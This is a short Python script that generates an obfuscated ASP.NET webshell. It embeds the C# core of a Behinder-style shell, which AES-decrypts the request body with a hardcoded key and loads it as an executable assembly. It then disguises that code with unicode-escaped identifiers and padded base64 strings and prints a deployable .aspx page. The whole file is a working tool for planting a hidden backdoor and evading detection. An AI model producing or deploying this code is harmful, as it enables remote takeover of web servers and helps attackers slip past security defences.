import re
import base64
import random

BEHINDER = '''
Session.Add("k", "e45e329feb5d925b");
byte[] k = Encoding.Default.GetBytes(Session[0] + "");
byte[] c = Request.BinaryRead(Request.ContentLength);
Type t1 = Type.GetType("System.Security.Cryptography.RijndaelManaged");
Type t2 = Type.GetType("System.Reflection.Assembly");    
t2.GetMethod("CreateInstance", new Type[] { typeof(string) }).Invoke(t2.GetMethod("Load", new Type[] { typeof(byte[]) }).Invoke(null, new object[] { ((System.Security.Cryptography.ICryptoTransform)t1.GetMethod("CreateDecryptor", new Type[] { typeof(byte[]), typeof(byte[]) }).Invoke(Activator.CreateInstance(t1), new object[] { k, k })).TransformFinalBlock(c, 0, c.Length) }), new object[] { "U" }).Equals(this);
'''


def replunicode(m):
    old = m.group(1)
    new = "".join([f'\\u{ord(c):04x}' for c in old])
    return m.group(0).replace(old, new)


def unicode(cs):
    return re.sub(r'[^"]\b([A-Z]\w+)\b', replunicode, cs)


def replstr(m):
    old: str = m.group(0)
    if len(old) == 2:
        return old
    old = old[1:-1]
    b64str = base64.b64encode(old.encode('utf-8')).decode('ascii')
    pad = random.choice("!@#$%^&*(){}:<>?.,;[]-|")
    new = pad.join(list(b64str))
    return f'System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("{new}".Replace("{pad}","")))'
def rstr(cs):
    return re.sub(r'".*?"', replstr, cs)

src = unicode(rstr(BEHINDER)).replace('\n','')
print(f'<%@ Page Language="C#"%><%{src}%>')
